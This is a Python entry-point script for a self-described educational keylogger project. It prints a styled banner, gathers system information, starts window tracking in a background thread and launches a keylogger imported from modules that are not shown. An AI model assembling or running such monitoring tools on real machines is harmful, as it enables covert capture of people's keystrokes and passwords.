from utils.keylogger import start_keylogger
from utils.system_info import get_system_info
from utils.window_tracker import track_windows

from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.align import Align

import threading
import time

# 🎨 Setup rich console
console = Console()

# 🌟 Create centered, styled welcome message
welcome_text = Text(justify="center")
welcome_text.append("\n🛡️ KEYLOGGER USING PYTHON SCRIPT\n", style="bold yellow")
welcome_text.append("Cybersecurity Educational Project\n", style="bold green")
welcome_text.append("By Devangi Khatri 🐍\n", style="bold cyan")
welcome_text.append("------------------------------------------", style="dim")

# 📦 Put text in a rich panel
panel = Panel(
    Align.center(welcome_text),
    title="[bold magenta]🚀 Project Started",
    subtitle=f"[bold blue]📅 {time.strftime('%Y-%m-%d %H:%M:%S')}",
    border_style="bold red",
    padding=(1, 5)
)

# 🖥️ Show centered banner
console.print(Align.center(panel))

# 🧠 Get and display system info
get_system_info()

# 🪟 Start window tracking in background thread
window_thread = threading.Thread(target=track_windows)
window_thread.start()

# ⌨️ Start keylogger
start_keylogger()

# ⏳ Keep running
while True:
    time.sleep(10)
